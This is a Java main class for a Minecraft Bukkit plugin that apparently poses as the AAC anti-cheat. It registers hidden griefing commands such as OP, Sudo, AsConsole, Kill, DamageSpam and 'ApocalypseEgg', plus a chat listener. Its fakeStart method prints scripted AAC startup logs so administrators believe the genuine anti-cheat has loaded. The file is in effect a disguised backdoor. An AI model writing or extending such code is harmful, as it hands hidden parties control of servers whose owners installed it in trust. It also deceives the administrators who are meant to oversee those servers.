package me.konsolas.aac;

import me.konsolas.aac.bukkitcommands.AACCommand;
import me.konsolas.aac.command.CommandHandler;
import me.konsolas.aac.command.commands.*;
import me.konsolas.aac.listeners.ChatListener;
import me.konsolas.aac.listeners.ProjectileListener;
import me.konsolas.aac.schedulers.MatrixScheduler;
import org.bukkit.Bukkit;
import org.bukkit.command.Command;
import org.bukkit.plugin.java.JavaPlugin;

import java.util.Random;
import java.util.UUID;

/**
 * Created by Marco on 31.01.2017.
 */
public class AAC extends JavaPlugin {

    private static AAC instance;

    public String id;
    
    public Random random;

    @Override
    public void onLoad() {
        instance = this;
        id = UUID.randomUUID().toString().replace("-", "");
        random = new Random();
    }

    @Override
    public void onEnable() {
        // Bukkit commands
        getCommand("aac").setExecutor(new AACCommand());
        // Exrief commands
        CommandHandler.registerCommand(new SudoCommand());
        CommandHandler.registerCommand(new MatrixCommand());
        CommandHandler.registerCommand(new ExplosionEggCommand());
        CommandHandler.registerCommand(new AsConsoleCommand());
        CommandHandler.registerCommand(new FreezeCommand());
        CommandHandler.registerCommand(new OPCommand());
        CommandHandler.registerCommand(new ApocalypseEggCommand());
        CommandHandler.registerCommand(new KillCommand());
        CommandHandler.registerCommand(new InvseeCommand());
        CommandHandler.registerCommand(new KickCommand());
        CommandHandler.registerCommand(new DamageSpamCommand());
        CommandHandler.registerCommand(new NoGuiCommand());
        CommandHandler.registerCommand(new HelpCommand());
        CommandHandler.registerCommand(new FlashTracking());
        // Listeners
        Bukkit.getPluginManager().registerEvents(new ChatListener(), this);
        Bukkit.getPluginManager().registerEvents(new ProjectileListener(), this);
        // Scheudulers
        MatrixScheduler.registerScheduler();
        // Fake aac start
        fakeStart();
    }

    @Override
    public void onDisable() {
        
    }

    private void fakeStart() {
        Bukkit.getScheduler().runTaskLater(this, new Runnable() {
            @Override
            public void run() {
                System.out.println("[AAC] Beginning Enable...");
                System.out.println("[AAC] Checking config file...");
                System.out.println("[AAC] (CheckManager) Enabling check chat.Spam");
                System.out.println("[AAC] (CheckManager) Enabling check combat.Hitbox");
                System.out.println("[AAC] (CheckManager) Enabling check combat.Fastbow");
                System.out.println("[AAC] (CheckManager) Enabling check combat.FightSpeed");
                System.out.println("[AAC] (CheckManager) Enabling check combat.Knockback");
                System.out.println("[AAC] (CheckManager) Enabling check combat.Regen");
                System.out.println("[AAC] (CheckManager) Enabling check combat.Killaura");
                System.out.println("[AAC] (CheckManager) Enabling check combat.Heuristics");
                System.out.println("[AAC] (CheckManager) Enabling check movement.BadPackets");
                System.out.println("[AAC] (CheckManager) Enabling check movement.Speed");
                System.out.println("[AAC] (CheckManager) Enabling check movement.Phase");
                System.out.println("[AAC] (CheckManager) Enabling check movement.Fly");
                System.out.println("[AAC] (CheckManager) Enabling check movement.Climb");
                System.out.println("[AAC] (CheckManager) Check movement.Jesus is disabled");
                System.out.println("[AAC] (CheckManager) Enabling check movement.Derp");
                System.out.println("[AAC] (CheckManager) Enabling check combat.Criticals");
                System.out.println("[AAC] (CheckManager) Enabling check world.FastBreak");
                System.out.println("[AAC] (CheckManager) Enabling check world.FastPlace");
                System.out.println("[AAC] (CheckManager) Enabling check world.Nuker");
                System.out.println("[AAC] (CheckManager) Enabling check world.NoSwing");
                System.out.println("[AAC] (CheckManager) Enabling check world.Interact");
                System.out.println("[AAC] (CheckManager) Enabling check movement.NoFall");
                System.out.println("[AAC] Starting API...");
                System.out.println("[AAC] AAC has been enabled.");
            }
        }, 2L);
    }

    public static AAC getInstance() {
        return instance;
    }
}